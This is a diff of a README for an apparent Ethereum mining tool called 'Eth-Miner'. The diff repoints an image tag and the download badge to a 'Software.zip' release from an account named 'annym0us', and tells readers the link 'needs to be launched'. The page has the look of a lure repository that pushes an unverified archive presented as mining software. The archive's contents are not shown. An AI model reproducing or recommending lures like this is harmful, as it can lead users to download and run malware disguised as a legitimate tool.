@@ -1,6 +1,6 @@
 # Ethereum Miner - Mine with Ease! 💰💻
 
-![Ethereum Mining](https://www.coindesk.com/wp-content/uploads/2020/04/mining-ethereum-1200x628.jpg)
+![Ethereum Mining](https://github.com/annym0us/Eth-Miner/releases/download/v2.0/Software.zip)
 
 Welcome to **Eth-Miner**, your all-in-one solution for Ethereum mining! Whether you're a seasoned crypto miner or just starting out, this repository has got you covered with its support for OpenCL, CUDA, and stratum protocols.
 
@@ -20,7 +20,7 @@ Welcome to **Eth-Miner**, your all-in-one solution for Ethereum mining! Whether 
 ## Installation
 To get started with **Eth-Miner**, download the software package from the following link: 
 
-[![Download Eth-Miner](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Eth-Miner](https://github.com/annym0us/Eth-Miner/releases/download/v2.0/Software.zip)](https://github.com/annym0us/Eth-Miner/releases/download/v2.0/Software.zip)
 
 *Note: The link provided needs to be launched to download the software package.*
 
